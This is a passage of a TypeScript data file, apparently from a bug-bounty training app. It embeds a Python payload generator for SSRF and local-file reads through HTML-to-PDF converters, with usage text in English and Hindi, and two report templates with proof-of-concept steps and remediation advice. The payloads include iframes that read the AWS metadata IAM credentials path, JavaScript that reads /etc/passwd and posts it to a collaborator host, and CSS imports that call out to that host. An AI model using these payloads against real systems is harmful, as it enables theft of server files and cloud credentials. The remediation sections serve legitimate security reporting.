        # 3. Cloud Provider Metadata SSRF
        ("AWS Metadata IMDSv1", "<iframe src='http://169.254.169.254/latest/meta-data/' width='800' height='500'></iframe>"),
        ("AWS Security Credentials", "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/' width='800' height='500'></iframe>"),
        ("GCP Metadata Token", f"<iframe src='{collaborator_url}/gcp_test'></iframe>"),
        ("DigitalOcean Metadata", "<iframe src='http://169.254.169.254/metadata/v1.json' width='800' height='500'></iframe>"),

        # 4. JavaScript Synchronous File Exfiltration
        ("JS Synchronous Read & Write", "<script>var x=new XMLHttpRequest;x.open('GET','file:///etc/passwd',false);x.send();document.write(x.responseText);</script>"),
        ("JS Blind Webhook Exfiltration", f"<script>var x=new XMLHttpRequest;x.open('GET','file:///etc/passwd',false);x.send();var p=new XMLHttpRequest;p.open('POST','{collaborator_url}/exfil',false);p.send(x.responseText);</script>"),

        # 5. CSS @import & Font SSRF
        ("CSS @import SSRF", f"<style>@import url('{collaborator_url}/css_import');</style>"),
        ("CSS Font SSRF", f"<style>@font-face {{ font-family: 'Test'; src: url('{collaborator_url}/font.woff'); }} body {{ font-family: 'Test'; }}</style>")
    ]

    print("=" * 70)
    print("PDF & HEADLESS BROWSER SSRF / LFI PAYLOAD PACK")
    print(f"Collaborator Listener: {collaborator_url}")
    print("=" * 70 + "\\n")

    for idx, (title, payload) in enumerate(payloads, 1):
        print(f"[{idx:02d}] {title}:")
        print(f"    {payload}\\n")

if __name__ == "__main__":
    collab = sys.argv[1] if len(sys.argv) > 1 else "http://YOUR_COLLABORATOR.burpcollaborator.net"
    generate_payloads(collab)`,
    howToUse: {
      en: "Run: `python3 pdf_payloads.py http://your-collab.net` to output customized injection strings ready to paste into invoice forms.",
      simple: "Run the script with your Collaborator link to generate all attack payloads.",
      hi: "`python3 pdf_payloads.py <आपका_लिंक>` चलाकर सभी पेलोड्स एक साथ देखें।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const PDF_SSRF_REPORT_TEMPLATES: PdfSsrfReportTemplate[] = [
  {
    id: "pdf-lfi-etc-passwd-p1",
    title: {
      en: "P1 / Critical: Full Local File Disclosure via HTML-to-PDF Conversion Engine (<iframe src='file:///etc/passwd'>)",
      simple: "P1: Server File Theft via PDF Invoice Generator",
      hi: "P1 / क्रिटिकल: PDF इनवॉइस जनरेटर के ज़रिए सर्वर की गुप्त फाइल्स (/etc/passwd) की चोरी",
    },
    vulnType: "Local File Inclusion / Server-Side Code Injection",
    cvss: "9.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
During testing of the document export functionality on **{TARGET_DOMAIN}**, a critical Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) vulnerability was discovered in the PDF generation pipeline at \`https://{TARGET_DOMAIN}/api/v1/invoices/export\`.

The application takes user-supplied profile details (such as company name and billing address) and renders them as a PDF using an unsandboxed headless browser (Puppeteer / Chromium / wkhtmltopdf). Because local file access is not disabled and input is not sanitized, an attacker can inject an \`<iframe>\` tag referencing \`file:///etc/passwd\`, resulting in the contents of sensitive server files being rendered directly onto the generated PDF document.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/v1/invoices/export\`
- **Vulnerable Parameter:** \`billing_address\`
- **Rendering Engine:** Headless Chrome / wkhtmltopdf
- **Impact:** Direct exfiltration of local operating system files (\`/etc/passwd\`, \`/etc/hosts\`, \`/proc/self/environ\`).

## Proof of Concept (PoC)

1. Navigate to user billing settings at \`https://{TARGET_DOMAIN}/settings/billing\`.
2. In the **Billing Address** input field, inject the following payload:
\`\`\`html
<iframe src="file:///etc/passwd" width="800" height="600" style="border:none"></iframe>
\`\`\`
3. Save changes and click **'Export Invoice PDF'**.
4. The application returns the generated PDF file.
5. Opening the PDF reveals the full contents of the host server's \`/etc/passwd\` file clearly printed in the document:
\`\`\`text
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
\`\`\`

## Impact
An attacker can view any file accessible to the web server process, including:
1. Environment variables (\`/proc/self/environ\`) leaking database passwords, JWT secrets, and AWS API keys.
2. Source code and configuration files disclosing proprietary business logic.
3. SSH private keys (\`/root/.ssh/id_rsa\`, \`/home/ubuntu/.ssh/id_rsa\`) leading to full remote host compromise.

## Remediation & Mitigation
1. **Disable Local File Access:** Configure the rendering engine to explicitly forbid the \`file://\` protocol scheme.
   - For Puppeteer/Playwright: Disallow local file access and disable JavaScript if dynamic scripts are not required.
   - For wkhtmltopdf: Run with \`--disable-local-file-access\`.
2. **Strict HTML Sanitization:** Sanitize all user input using an allowlist-based sanitizer (e.g. DOMPurify) to strip dangerous tags like \`<iframe>\`, \`<object>\`, \`<embed>\`, and \`<script>\`.
3. **Container Isolation & Sandboxing:** Execute PDF conversion inside an isolated, non-root, ephemeral container without access to internal host volumes or network interfaces.`,
  },
  {
    id: "pdf-cloud-metadata-ssrf-p1",
    title: {
      en: "P1 / Critical: AWS Cloud Metadata Exfiltration & IAM Key Disclosure via PDF Generation SSRF",
      simple: "P1: Stealing AWS Master Cloud Keys via PDF Generator",
      hi: "P1 / क्रिटिकल: PDF जनरेटर से AWS क्लाउड मेटाडेटा और IAM क्रेडेंशियल्स की चोरी",
    },
    vulnType: "Server-Side Request Forgery (SSRF) / Cloud Credential Exposure",
    cvss: "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical Server-Side Request Forgery (SSRF) vulnerability exists in the document conversion service on **{TARGET_DOMAIN}**. By supplying an \`<iframe>\` pointing to the AWS instance metadata service (\`http://169.254.169.254/\`), an attacker can force the backend rendering instance to query internal AWS endpoints and print temporary IAM role credentials directly onto the generated PDF.

## Technical Details
- **Endpoint:** \`POST https://{TARGET_DOMAIN}/api/resume/download\`
- **SSRF Target:** \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
- **Result:** Temporary \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\` rendered in PDF document.

## Proof of Concept

\`\`\`html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}" width="800" height="400"></iframe>
\`\`\`

The generated PDF displays the AWS IAM credentials:
\`\`\`json
{
  "Code": "Success",
  "LastUpdated": "2026-10-23T04:30:12Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-10-23T10:45:00Z"
}
\`\`\`

## Remediation
1. **Require IMDSv2:** Configure AWS EC2 instances to enforce IMDSv2 (\`HttpTokens=required\`, \`HttpPutResponseHopLimit=1\`).
2. **Network Egress Firewall:** Block outbound connections from rendering worker nodes to \`169.254.169.254\` via local \`iptables\` rules or AWS Security Group policies.`,
  },
];
